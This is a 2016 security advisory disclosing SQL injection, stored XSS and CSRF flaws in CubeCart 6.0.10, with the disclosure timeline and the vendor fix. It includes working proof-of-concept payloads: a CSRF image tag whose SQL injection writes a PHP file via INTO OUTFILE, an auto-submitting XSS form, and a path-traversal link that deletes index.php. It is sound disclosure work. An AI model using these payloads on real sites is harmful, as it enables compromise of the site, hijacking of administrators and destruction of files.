@@ -1,0 +1,88 @@
+Advisory ID: HTB23298
+Product: CubeCart
+Vendor: CubeCart Limited
+Vulnerable Version(s): 6.0.10 and probably prior
+Tested Version: 6.0.10
+Advisory Publication: March 2, 2016 [without technical details]
+Vendor Notification: March 2, 2016 
+Vendor Patch: March 16, 2016 
+Public Disclosure: March 30, 2016 
+Vulnerability Type: SQL Injection [CWE-89], Cross-Site Scripting [CWE-79], Cross-Site Request Forgery [CWE-352]
+Risk Level: Medium 
+CVSSv3 Base Scores: 6.6 [CVSS:3.0/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H], 6.1 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N], 4.7 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:N/A:L]
+Solution Status: Fixed by Vendor
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )
+
+------------------------------------------------------------------------
+-----------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in popular open source shopping software CubeCart. The discovered vulnerabilities allow a remote attacker to compromise vulnerable website and its databases, and conduct sophisticated attacks against its users.
+
+1) SQL Injection in CubeCart
+
+The vulnerability exists due to insufficient filtration of user-supplied data passed via "char" HTTP GET parameter to "/admin.php" PHP script. A remote authenticated attacker with privileges to view list of products can alter present SQL query, inject and execute arbitrary SQL commands in the application's database. This vulnerability can be also exploited by anonymous attacker via CSRF vector.
+
+A simple CSRF exploit below will create a PHP file "/var/www/site/file.php" (assuming MySQL has writing permissions to this directory), which can execute phpinfo() function:
+<img src="http://[host]/admin.php?_g=products&cat_id=1&sort[updated]=DESC&cha
+r=T]%27%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,'<? phpinfo(); ?>',1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8%20INTO%20OUT
+FILE%20'/var/www/site/file.php'%20--%202">
+
+2) Stored Cross-Site Scripting in CubeCart
+
+The vulnerability exists due to insufficient filtration of user-supplied input passed via "first_name" and "last_name" HTTP POST parameters to "/index.php" script. A remote authenticated attacker can edit his or her profile, permanently inject malicious HTML and JavaScript code and execute it in administrator's browser in context of vulnerable website, when the "Customer List" page is viewed. Exploitation of this vulnerability requires the attacker to have valid user credentials, however registration is open by default.
+
+Successful exploitation of this vulnerability may allow a remote attacker to gain complete control over the web application once the logged-in administrator just visits "Customer List" page. This vulnerability can also be used to perform drive-by-download or spear-phishing attacks against.
+
+To reproduce the vulnerability, log in to the website with privileges of a regular user and use the exploit below to modify "First" and "Last name" in attacker's profile:
+
+<form action="http://[host]/index.php?_a=profile" method="POST" name="f1">
+<input type="hidden" name="title" value="title" />
+<input type="hidden" name="first_name" value='" onmouseover="javascript:alert(/ImmuniWeb/);"' />
+<input type="hidden" name="last_name" value='" onmouseover="javascript:alert(/ImmuniWeb/);"' />
+<input type="hidden" name="email" value="mail (at) mail (dot) com [email concealed]" />
+<input type="hidden" name="phone" value="1234567" />
+<input type="hidden" name="mobile" value="" />
+<input type="hidden" name="passold" value="" />
+<input type="hidden" name="passnew" value="" />
+<input type="hidden" name="passconf" value="" />
+<input type="hidden" name="update" value="Update" />
+<input type="submit" value="Submit request" />
+</form><script>document.f1.submit();</script>
+
+A JS popup with "ImmuniWeb" word will be displayed, when the website administrator visits the "Customer List" page:
+http://[host]/admin.php?_g=customers
+
+3) Cross-Site Request Forgery in CubeCart
+
+The vulnerability exists due to insufficient validation of HTTP request origin, when deleting local files. A remote unauthenticated attacker can create a specially crafted malicious web page with CSRF exploit, trick a logged-in administrator to visit the page, spoof the HTTP request, as if it was coming from the legitimate user, and delete arbitrary file on the system.
+
+A simple exploit below will delete file "/index.php". To reproduce the vulnerability, just log in as an administrator and visit the link below:
+http://[host]/admin.php?_g=maintenance&node=index&delete=../index.php
+
+------------------------------------------------------------------------
+-----------------------
+
+Solution:
+
+Update to CubeCart 6.0.11
+
+More Information:
+https://forums.cubecart.com/topic/51079-cubecart-6011-released/
+
+------------------------------------------------------------------------
+-----------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23298 - https://www.htbridge.com/advisory/HTB23298 - Multiple Vulnerabilities in CubeCart
+[2] CubeCart - https://www.cubecart.com/ - CubeCart is a free responsive open source PHP ecommerce software system.
+[3] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
+[4] ImmuniWebÂ® - https://www.htbridge.com/immuniweb/ - web security platform by High-Tech Bridge for on-demand and continuous web application security, vulnerability management, monitoring and PCI DSS compliance.
+[5] Free SSL/TLS Server test - https://www.htbridge.com/ssl/ - check your SSL implementation for PCI DSS and NIST compliance. Supports all types of protocols.
+
+------------------------------------------------------------------------
+-----------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
